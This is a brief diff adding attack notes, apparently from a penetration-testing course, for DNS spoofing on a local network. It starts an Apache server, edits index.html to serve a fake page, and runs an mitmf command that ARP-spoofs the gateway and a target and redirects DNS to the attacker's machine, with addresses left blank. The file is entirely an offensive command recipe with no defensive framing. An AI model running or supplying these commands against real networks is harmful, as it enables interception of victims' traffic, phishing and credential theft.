@@ -1,0 +1,7 @@
+: DNS spoofing :
+: need to ON apache server :
+service apache2 start
+: to change the site or webpage :
+/var/www/html/index.html
+: to set the domain to our ip :
+mitmf --arp --spoof --gateway [] --target [] -i [] --dns
